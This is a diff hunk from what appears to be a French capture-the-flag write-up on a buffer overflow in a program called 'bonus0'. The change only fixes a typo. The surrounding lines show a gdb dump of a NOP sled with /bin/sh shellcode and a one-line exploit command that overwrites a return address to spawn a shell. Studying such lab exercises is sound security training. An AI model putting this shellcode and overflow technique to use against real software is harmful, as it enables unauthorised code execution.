@@ -62,7 +62,7 @@ on recupere l'adresse de notre shellcode
 (gdb) x 0xbffff898
 0xbffff898:	 "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\311\367\341Qh//shh/bin\211\343\260\v̀"
 
-et on execute le programme avec l'adresse de notre shellcode a la place des caractere 10 a 13 de la 2emesaisie.
+et on execute le programme avec l'adresse de notre shellcode a la place des caractere 10 a 13 de la 2eme saisie.
 
 cat <(python -c 'print( "A" * 20)') <(python -c 'print( "B" * 9 + "\x98\xf8\xff\xbf" + "B" * 7)') - | ./bonus0
 
